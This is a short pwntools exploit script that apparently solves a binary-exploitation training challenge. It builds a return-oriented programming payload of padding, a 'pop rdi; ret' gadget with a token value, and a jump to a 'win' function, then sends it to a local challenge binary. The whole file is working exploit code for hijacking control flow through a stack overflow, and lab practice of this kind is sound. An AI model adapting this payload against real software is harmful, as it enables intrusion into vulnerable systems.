from pwn import *

#0x0000000000402093 : pop rdi ; ret
pop_gadjet = 0x402093
token = 0x1337
offset = 0x98
ret_gadjet = 0x40101a
win_adrr = 0x40184e
payload = offset * b'A' +p64(pop_gadjet) +  p64(token) + p64(ret_gadjet) + p64(win_adrr)
r = process('/challenge/binary-exploitation-control-hijack-2-w')
r.send(payload)
r.interactive()